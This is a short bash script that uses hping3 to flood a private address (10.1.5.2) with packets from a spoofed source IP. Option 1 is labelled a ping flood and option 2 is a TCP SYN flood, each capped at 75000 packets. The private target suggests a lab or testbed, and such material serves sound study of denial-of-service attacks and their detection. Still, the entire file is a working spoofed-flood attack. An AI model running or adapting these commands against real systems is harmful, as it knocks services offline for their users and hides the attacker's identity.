#!/bin/bash

###############################
# Author: Piva Davide         #
###############################

if [[ $# -lt 2 ]]
then
    echo "USAGE: ./flood_hping.sh <option> <srcIP>"
    echo "option 1: ping flood"
    echo "option 2: tcp syn flood"
    exit 1
fi

if [ "$1" == "1" ];
then
    echo "Start ping flood"
    sudo hping3 10.1.5.2 --flood --win 64240 --spoof $2 --count 75000 &
fi

if [ "$1" == "2" ];
then
    echo "Start SYN flood"
    sudo hping3 10.1.5.2 --flood --win 64240 --spoof $2 --count 75000 --syn &
fi